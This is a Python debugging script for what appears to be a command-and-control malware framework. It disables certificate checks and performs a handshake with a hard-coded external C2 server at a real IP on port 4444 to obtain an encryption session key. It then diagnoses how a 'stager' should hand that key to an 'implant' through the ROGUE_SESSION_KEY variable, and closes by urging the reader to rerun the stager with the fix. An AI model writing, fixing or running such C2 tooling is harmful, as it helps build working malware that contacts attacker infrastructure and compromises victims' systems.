#!/usr/bin/env python3
"""
Debug session key issue
"""

import urllib.request
import json
import base64
import hashlib
import time
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

c2_url = "http://187.124.153.242:4444"

print("=== DEBUG SESSION KEY ===")

# 1. Handshake
fingerprint = hashlib.sha256(f'test_{time.time()}'.encode()).hexdigest()
data = json.dumps({'fp': fingerprint}).encode()
req = urllib.request.Request(f"{c2_url}/handshake", data=data, 
                             headers={'Content-Type': 'application/json'}, 
                             method='POST')

resp = urllib.request.urlopen(req, timeout=10, context=ctx)
response = json.loads(resp.read().decode())
key = response.get('key')

print(f"1. Handshake response key: {key}")
print(f"   Length: {len(key)}")
print(f"   Is base64? {'=' in key or '+' in key or '/' in key}")

# 2. Check if it's valid Fernet key
try:
    from cryptography.fernet import Fernet
    f = Fernet(key.encode() if isinstance(key, str) else key)
    test_data = f.encrypt(b"test")
    decrypted = f.decrypt(test_data)
    print(f"2. ✅ Valid Fernet key: Can encrypt/decrypt")
except Exception as e:
    print(f"2. ❌ Invalid Fernet key: {e}")

# 3. What the stager does
key_encoded = base64.b64encode(key.encode()).decode()
print(f"3. Stager encodes to base64: {key_encoded[:50]}...")
print(f"   Encoded length: {len(key_encoded)}")

# 4. What implant expects
print(f"\n4. Implant expects base64 in ROGUE_SESSION_KEY")
print(f"   Current ROGUE_SESSION_KEY would be: {key_encoded[:50]}...")

# 5. Try to decrypt what implant would receive
try:
    decoded_key = base64.b64decode(key_encoded)
    print(f"5. Decoding gives back: {decoded_key[:20]}...")
    print(f"   Matches original? {decoded_key == key.encode()}")
except Exception as e:
    print(f"5. ❌ Decode error: {e}")

print("\n=== RECOMMENDATION ===")
print("The handshake returns a Fernet key (already base64).")
print("The stager should NOT re-encode it with base64.")
print("Just set: os.environ['ROGUE_SESSION_KEY'] = key")
print("\nTry running stager with this fix!")